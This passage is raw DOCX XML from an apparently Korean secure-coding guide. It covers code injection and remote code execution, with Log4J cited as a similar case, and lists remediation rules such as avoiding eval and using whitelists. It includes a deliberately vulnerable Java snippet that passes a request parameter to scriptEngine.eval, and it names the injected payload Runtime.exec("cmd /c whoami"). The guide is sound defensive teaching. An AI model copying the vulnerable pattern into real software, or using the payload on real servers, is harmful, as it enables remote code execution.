                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> --&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>SELECT * FROM board WHERE title LIKE '%'||#{keyword}||'%'</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B30C6E"/>
    <w:p w:rsidR="001E295D" w:rsidRDefault="001E295D"/>
    <w:p w:rsidR="001E295D" w:rsidRDefault="001E295D"/>
    <w:p w:rsidR="001E295D" w:rsidRDefault="001E295D"/>
    <w:p w:rsidR="001E295D" w:rsidRDefault="001E295D"/>
    <w:p w:rsidR="001E295D" w:rsidRDefault="001E295D"/>
    <w:p w:rsidR="00B30C6E" w:rsidRPr="00BD5D9D" w:rsidRDefault="00B31433">
      <w:pPr>
        <w:pStyle w:val="21"/>
        <w:rPr>
          <w:rFonts w:eastAsia="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve">2. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>코드</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>삽입</w:t>
      </w:r>
      <w:r w:rsidR="00BD5D9D">
        <w:rPr>
          <w:rFonts w:eastAsia="맑은 고딕" w:hint="eastAsia"/>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00BD5D9D">
        <w:rPr>
          <w:rFonts w:eastAsia="맑은 고딕"/>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve">– </w:t>
      </w:r>
      <w:r w:rsidR="00BD5D9D">
        <w:rPr>
          <w:rFonts w:eastAsia="맑은 고딕" w:hint="eastAsia"/>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>원격</w:t>
      </w:r>
      <w:r w:rsidR="00BD5D9D">
        <w:rPr>
          <w:rFonts w:eastAsia="맑은 고딕" w:hint="eastAsia"/>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00BD5D9D">
        <w:rPr>
          <w:rFonts w:eastAsia="맑은 고딕" w:hint="eastAsia"/>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>코드</w:t>
      </w:r>
      <w:r w:rsidR="00BD5D9D">
        <w:rPr>
          <w:rFonts w:eastAsia="맑은 고딕" w:hint="eastAsia"/>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00BD5D9D">
        <w:rPr>
          <w:rFonts w:eastAsia="맑은 고딕" w:hint="eastAsia"/>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>실행</w:t>
      </w:r>
      <w:r w:rsidR="00BD5D9D">
        <w:rPr>
          <w:rFonts w:eastAsia="맑은 고딕" w:hint="eastAsia"/>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00BD5D9D">
        <w:rPr>
          <w:rFonts w:eastAsia="맑은 고딕"/>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> (</w:t>
      </w:r>
      <w:r w:rsidR="00C67DD2">
        <w:rPr>
          <w:rFonts w:eastAsia="맑은 고딕" w:hint="eastAsia"/>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>유사사례</w:t>
      </w:r>
      <w:r w:rsidR="00C67DD2">
        <w:rPr>
          <w:rFonts w:eastAsia="맑은 고딕" w:hint="eastAsia"/>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> :</w:t>
      </w:r>
      <w:r w:rsidR="00C67DD2">
        <w:rPr>
          <w:rFonts w:eastAsia="맑은 고딕"/>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00BD5D9D">
        <w:rPr>
          <w:rFonts w:eastAsia="맑은 고딕"/>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve">Log4J) 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9122"/>
      </w:tblGrid>
      <w:tr w:rsidR="00B30C6E">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9122" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFF2CC"/>
          </w:tcPr>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="1F3564"/>
                <w:sz w:val="18"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>[</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="1F3564"/>
                <w:sz w:val="18"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>준수사항</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="1F3564"/>
                <w:sz w:val="18"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>]</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:ind w:left="170"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">• </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>동적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코드를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실행할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수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있는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함수</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">(eval </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>등</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>)</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>를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사용하지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않는다</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>.</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:ind w:left="170"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">• </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>불가피한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경우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허용할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값을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화이트리스트로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사전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정의하고</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">, </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>그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목록에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있는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값만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통과시킨다</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>.</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:ind w:left="170"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">• </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>정규식으로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유효한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문자</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>(</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>영문자</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">, </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>숫자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등</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>)</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>만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허용하고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나머지는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예외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처리한다</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B30C6E">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pP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9122"/>
      </w:tblGrid>
      <w:tr w:rsidR="00B30C6E">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9122" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FCE4D6"/>
          </w:tcPr>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>[</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>취약한</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>코드</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>예</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>]</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>// [</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>취약</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">] </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>사용자</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>입력을</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>그대로</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>스크립트</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>엔진으로</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>실행</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>String src = request.getParameter("src");</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">scriptEngine.eval(src);  // </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>공격자가</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>임의</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>코드</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>실행</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>가능</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B1529A" w:rsidRPr="00A22A78" w:rsidRDefault="00A22A78" w:rsidP="00A22A78">
            <w:pPr>
              <w:pStyle w:val="aa"/>
              <w:numPr>
                <w:ilvl w:val="0"/>
                <w:numId w:val="10"/>
              </w:numPr>
              <w:rPr>
                <w:rFonts w:eastAsia="맑은 고딕"/>
                <w:sz w:val="14"/>
                <w:szCs w:val="14"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00A22A78">
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>scriptEngine</w:t>
            </w:r>
            <w:r w:rsidRPr="00A22A78">
              <w:rPr>
                <w:rFonts w:eastAsia="맑은 고딕" w:hint="eastAsia"/>
                <w:sz w:val="14"/>
                <w:szCs w:val="14"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="00A22A78">
              <w:rPr>
                <w:rFonts w:eastAsia="맑은 고딕" w:hint="eastAsia"/>
                <w:sz w:val="14"/>
                <w:szCs w:val="14"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>은</w:t>
            </w:r>
            <w:r w:rsidRPr="00A22A78">
              <w:rPr>
                <w:rFonts w:eastAsia="맑은 고딕" w:hint="eastAsia"/>
                <w:sz w:val="14"/>
                <w:szCs w:val="14"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidR="00B1529A" w:rsidRPr="00A22A78">
              <w:rPr>
                <w:rFonts w:eastAsia="맑은 고딕" w:hint="eastAsia"/>
                <w:sz w:val="14"/>
                <w:szCs w:val="14"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>입력된</w:t>
            </w:r>
            <w:r w:rsidR="00B1529A" w:rsidRPr="00A22A78">
              <w:rPr>
                <w:rFonts w:eastAsia="맑은 고딕" w:hint="eastAsia"/>
                <w:sz w:val="14"/>
                <w:szCs w:val="14"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidR="00B1529A" w:rsidRPr="00A22A78">
              <w:rPr>
                <w:rFonts w:eastAsia="맑은 고딕"/>
                <w:sz w:val="14"/>
                <w:szCs w:val="14"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>src</w:t>
            </w:r>
            <w:r w:rsidR="00B1529A" w:rsidRPr="00A22A78">
              <w:rPr>
                <w:rFonts w:eastAsia="맑은 고딕" w:hint="eastAsia"/>
                <w:sz w:val="14"/>
                <w:szCs w:val="14"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>내에</w:t>
            </w:r>
            <w:r w:rsidR="00B1529A" w:rsidRPr="00A22A78">
              <w:rPr>
                <w:rFonts w:eastAsia="맑은 고딕" w:hint="eastAsia"/>
                <w:sz w:val="14"/>
                <w:szCs w:val="14"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidR="00B1529A" w:rsidRPr="00A22A78">
              <w:rPr>
                <w:rFonts w:eastAsia="맑은 고딕" w:hint="eastAsia"/>
                <w:sz w:val="14"/>
                <w:szCs w:val="14"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>삽입된</w:t>
            </w:r>
            <w:r w:rsidR="00B1529A" w:rsidRPr="00A22A78">
              <w:rPr>
                <w:rFonts w:eastAsia="맑은 고딕" w:hint="eastAsia"/>
                <w:sz w:val="14"/>
                <w:szCs w:val="14"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="00A22A78">
              <w:rPr>
                <w:rFonts w:eastAsia="맑은 고딕"/>
                <w:sz w:val="14"/>
                <w:szCs w:val="14"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>javascript</w:t>
            </w:r>
            <w:r w:rsidR="00B1529A" w:rsidRPr="00A22A78">
              <w:rPr>
                <w:rFonts w:eastAsia="맑은 고딕" w:hint="eastAsia"/>
                <w:sz w:val="14"/>
                <w:szCs w:val="14"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>코드를</w:t>
            </w:r>
            <w:r w:rsidR="00B1529A" w:rsidRPr="00A22A78">
              <w:rPr>
                <w:rFonts w:eastAsia="맑은 고딕" w:hint="eastAsia"/>
                <w:sz w:val="14"/>
                <w:szCs w:val="14"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidR="00B1529A" w:rsidRPr="00A22A78">
              <w:rPr>
                <w:rFonts w:eastAsia="맑은 고딕" w:hint="eastAsia"/>
                <w:sz w:val="14"/>
                <w:szCs w:val="14"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>실행</w:t>
            </w:r>
            <w:r w:rsidRPr="00A22A78">
              <w:rPr>
                <w:rFonts w:eastAsia="맑은 고딕" w:hint="eastAsia"/>
                <w:sz w:val="14"/>
                <w:szCs w:val="14"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>한다</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="002B1872">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9122" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFF2CC"/>
          </w:tcPr>
          <w:p w:rsidR="002B1872" w:rsidRDefault="00913677">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="C00000"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>[</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="C00000"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>위험</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="C00000"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">] </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>공격자가</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> src </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>파라미터에</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> Runtime.exec("cmd /c whoami") </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>같은</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>코드를</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>입력하면</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>서버에서</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
